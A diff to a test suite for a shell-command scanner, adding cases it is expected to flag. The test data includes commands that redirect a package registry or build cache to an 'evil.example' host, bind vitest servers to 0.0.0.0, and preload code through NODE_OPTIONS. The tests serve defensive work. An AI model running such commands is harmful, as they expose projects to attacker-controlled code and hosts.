@@ -477,6 +477,7 @@ describe('scanShell', () => {
       ['a package-manager option off the list', 'pnpm --config.registry=https://evil.example test'],
       ['a vitest API server', 'vitest --api.host 0.0.0.0'],
       ['the vitest UI', 'vitest --ui'],
+      ['a vitest browser-mode API server', 'vitest --browser.api.host=0.0.0.0'],
       ['vitest init, which installs', 'vitest init browser'],
       ['eslint init, which installs', 'eslint --init'],
       ['a turbo remote cache', 'turbo run build --api=https://evil.example'],
@@ -499,7 +500,7 @@ describe('scanShell', () => {
         text: 'pnpm exec vitest run x',
         always: 'pnpm exec vitest *',
         coverable: true,
-        words: 'pnpm --filter @x/y exec vitest run x',
+        words: 'VITEST_MAX_WORKERS=25% pnpm --filter @x/y exec vitest run x',
       });
       const [steered] = (await scan('NODE_OPTIONS=--require=./x.js pnpm exec vitest run x')).commands;
       expect(steered.coverable).toBe(false);
